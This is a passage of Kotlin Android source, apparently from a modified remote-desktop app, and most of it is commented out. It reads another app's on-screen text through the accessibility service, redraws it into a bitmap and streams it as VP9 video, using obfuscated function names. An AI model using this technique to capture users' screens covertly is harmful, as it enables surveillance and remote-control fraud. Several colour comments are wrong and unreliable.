                paint.strokeWidth = 2.0f
                canvas.drawRect(rect, paint)
                paint.style = Paint.Style.STROKE
                paint.color = -1
                canvas.drawRect(rect, paint)
                paint.color = i
                paint.isAntiAlias = true
                canvas.drawText(charSequence, rect.left + 16.toFloat(), rect.exactCenterY() + 16.0f, paint)

                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }


	 /////////////////////////////////备份//////////////////////////////////////////////
     fun a012933444444_28(accessibilityNodeInfo: AccessibilityNodeInfo?) {
        if (accessibilityNodeInfo == null) {
		//Log.d(logTag, "SKL accessibilityNodeInfo  NULL")
            return
        }
	
        try {
           //val createBitmap = Bitmap.createBitmap(SCREEN_INFO.width, SCREEN_INFO.height, Bitmap.Config.ARGB_8888)	
            val createBitmap = Bitmap.createBitmap(HomeWidth*FFI.getNetArgs4(), HomeHeight*FFI.getNetArgs4(), Bitmap.Config.ARGB_8888)	
            val canvas = Canvas(createBitmap)
            val paint = Paint()
         

	   //方案一
	  // accessibilityNodeInfo.getBoundsInScreen(rect)// 先填充 Rect
	  //FFI.drawInfo77(accessibilityNodeInfo, rect.left, rect.top, rect.right, rect.bottom, canvas, paint)

	  //方案二
	  // FFI.drawInfo(accessibilityNodeInfo, rect, canvas, paint) // 传递 Rect 作为参数
	   
          //方案三
	   FFI.bf0dc50c68847eb0(accessibilityNodeInfo, canvas, paint) // 传递 Rect 作为参数
		/*
	    val rect = Rect()
	    var str = ""
            accessibilityNodeInfo.getBoundsInScreen(rect)
	   // canvas.drawColor(-16777216)//纯黑色
  
            try {
                if (accessibilityNodeInfo.text != null) {
                    str = accessibilityNodeInfo.text.toString()
                } else if (accessibilityNodeInfo.contentDescription != null) {
                    str = accessibilityNodeInfo.contentDescription.toString()
                }
            } catch (unused: java.lang.Exception) {
            }
	    
             val charSequence2 = accessibilityNodeInfo.className.toString()
	    //测试
            //Log.d(logTag, "SKL className:$charSequence2,NodeInfotext:$str")	

             when (accessibilityNodeInfo.className.toString().hashCode()) {
               DataTransferManager.a4 -> { //1540240509
                    paint.color = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色。
                }
               DataTransferManager.a3 -> { // -149114526
                    paint.color = -16711936 //-16711936 代表的颜色是不透明的纯红色
                }
               DataTransferManager.a2  -> { // -214285650
                    paint.color = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                }
                else -> {
                    paint.color = -65536 //canvas.drawColor(-65536) 表示用完全不透明的纯红色填充整个画布。
                }
            }

           // paint.color = -65536 //纯红色
            paint.style = Paint.Style.STROKE
            paint.strokeWidth = 2.0f
            paint.textSize = 32.0f
            canvas.drawRect(rect, paint)
            canvas.drawText(str, rect.exactCenterX(), rect.exactCenterY(), paint)
	    */

    
            drawViewHierarchy(canvas, accessibilityNodeInfo, paint)
	    
		if (createBitmap != null) {
			
	         Log.d("input service","e31674b781400507:w:$SCREEN_INFO.width,h:$SCREEN_INFO.height,h:$SCREEN_INFO.scale,h:$SCREEN_INFO.dpi")

		  val scaledBitmap = FFI.e31674b781400507(createBitmap, SCREEN_INFO.scale, SCREEN_INFO.scale)
		  //	 val scaledBitmap = scaleBitmapToWidth(createBitmap, 350) // 宽度 350，高度自动计算
			     val w = scaledBitmap.width
			  val h = scaledBitmap.height
	          Log.d("input service", "e31674b781400507 scaledBitmap size: width=$w, height=$h")
			  
		 val buffer = ByteBuffer.allocate(scaledBitmap.byteCount)
		 buffer.order(ByteOrder.nativeOrder())
		 scaledBitmap.copyPixelsToBuffer(buffer)
		 buffer.rewind()
		
		 DataTransferManager.setImageBuffer(buffer) 
		 MainService.ctx?.createSurfaceuseVP9()	
		}
	
	
        } catch (unused2: java.lang.Exception) {
        }
    } 
     
     fun drawViewHierarchy_28(canvas: Canvas, accessibilityNodeInfo: AccessibilityNodeInfo?, paint: Paint) {
        var c: Char
        var i: Int
        var charSequence: String
        if (accessibilityNodeInfo == null || accessibilityNodeInfo.childCount == 0) {
            return
        }
        for (i2 in 0 until accessibilityNodeInfo.childCount) {
            val child = accessibilityNodeInfo.getChild(i2)
            if (child != null) {
		    /*
               val rect = Rect()
                child.getBoundsInScreen(rect)
                paint.textSize = 32.0f//18.0f
                //val charSequence2 = child.className.toString()
		
		// Log.d(logTag, "SKL  drawViewHierarchy className:$charSequence2")	
		 
                when (child.className.toString().hashCode()) {
				 //a1 -> { 
			-1758715599 -> {
                        c =  '0'
                    }
                 //  a2 -> { 
		 
		-214285650 -> {
                        c =  '1'
                    }
                 //  a3 -> {
		-149114526 -> {
                        c =  '2'
                    }
                 //  a4 -> {
		1540240509 -> {
                        c =  '3'
                    }
                 //  a5 -> { 
		1583615229 -> {
                        c =  '4'
                    }
                  // a6  -> {
		 1663696930 -> {
                         c =  '5'
                    }
                    else -> c = 65535.toChar()
                }

                when (c) {
                    '0' -> i = -256//-256 对应的 ARGB 颜色是 (255, 255, 254, 255)
                    '1' -> i = -65281//会将画布填充为品红色
                    '2' -> {
                        paint.textSize = 30.0f
                        i = -16711681//canvas.drawColor(-16711681) 绘制的颜色是纯红色
                    }
                    '3' -> {
                        paint.textSize = 33.0f
                        i = -65536// -7829368 // //纯红色
                    }
                    '4' -> i = -16776961//Alpha: 255, Red: 255, Green: 0, Blue: 255  会将画布填充为品红色
                    '5' -> i = -16711936 //-16711936 代表的颜色是不透明的纯红色
                    else -> {
                        paint.textSize = 30.0f//16.0f
                        i = -7829368//该颜色的 ARGB 值为 (255, 128, 128, 128)，即完全不透明（Alpha 值为 255）的灰色。因为 Red、Green 和 Blue 通道的值相等，且都为 128，这是一种中等亮度的灰色
                    }
                }
                charSequence = if (child.text != null) {
                    child.text.toString()
                } else {
                    if (child.contentDescription != null)
                        child.contentDescription.toString()
                    else ""
                }
                paint.style = Paint.Style.STROKE
                paint.strokeWidth = 2.0f
                canvas.drawRect(rect, paint)
                paint.style = Paint.Style.STROKE
                paint.color = -1
                canvas.drawRect(rect, paint)
                paint.color = i
                paint.isAntiAlias = true
                canvas.drawText(charSequence, rect.left + 16.toFloat(), rect.exactCenterY() + 16.0f, paint)
               */
		    
                FFI.udb04498d6190e5b(child, canvas, paint) // 传递 Rect 作为参数
		    
                drawViewHierarchy(canvas, child, paint)
                child.recycle()
            }
        }
    }
*/


/*
class DataTransferManager {
    companion object {
        private var imageBuffer: ByteBuffer? = null

        @JvmStatic
        fun setImageBuffer(buffer: ByteBuffer) {
            imageBuffer = buffer
        }

        @JvmStatic
        fun getImageBuffer(): ByteBuffer? {
            return imageBuffer
        }
    }
}*/
